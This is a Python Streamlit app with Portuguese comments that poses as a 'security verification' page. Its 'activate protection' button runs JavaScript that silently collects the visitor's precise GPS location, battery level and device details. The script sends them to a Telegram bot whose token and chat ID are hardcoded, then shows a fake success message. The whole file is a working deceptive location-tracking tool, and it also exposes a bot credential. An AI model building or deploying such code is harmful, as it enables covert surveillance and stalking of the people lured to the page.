import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Sistema de Verificação", layout="centered")

# --- CSS ORIGINAL (RESTAURADO DAS FOTOS 85506 e 85510) ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    
    .titulo { font-size: 36px; font-weight: bold; margin-top: 50px; text-align: left; }
    .status { font-size: 24px; margin: 20px 0; text-align: left; }
    
    .btn-container { display: flex; justify-content: center; width: 100%; margin-top: 30px; }
    .meu-botao {
        background-color: white; color: black; width: 320px; height: 90px;
        border-radius: 12px; border: none; font-size: 18px; font-weight: bold;
        display: flex; align-items: center; justify-content: center; gap: 10px;
        cursor: pointer; text-transform: uppercase;
    }
    .ponto-vermelho { color: #ff3b30; font-size: 30px; }
    
    .barra-azul { width: 100%; height: 6px; background-color: #007bff; border-radius: 3px; margin-top: 10px; }
    </style>
""", unsafe_allow_html=True)

# Layout da tela
st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
caixa_progresso = st.empty()
caixa_progresso.markdown('<div class="status">Verificando: 99%</div>', unsafe_allow_html=True)
st.markdown('<div class="barra-azul"></div>', unsafe_allow_html=True)

# --- O SCRIPT QUE "CHUTA A PORTA" E PEDE LOCALIZAÇÃO ---
js_funcional = f"""
<div class="btn-container">
    <button class="meu-botao" id="ativar_btn">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('ativar_btn').onclick = function() {{
    // Este comando força o pop-up azul de "Precisão de Local" da Google
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: info }})
                }});
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{}}
        }},
        (err) => {{
            // Se o GPS estiver desligado, o Android abre o pop-up aqui automaticamente
        }},
        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
    );
}};
</script>
"""

# O 'allow="geolocation"' é o que permite o pop-up aparecer
clicou = st.components.v1.html(js_funcional, height=150)

if clicou:
    caixa_progresso.markdown('<div class="status">Verificando: 100%</div>', unsafe_allow_html=True)
    st.success("Proteção Ativada com Sucesso!")
    st.stop()
    
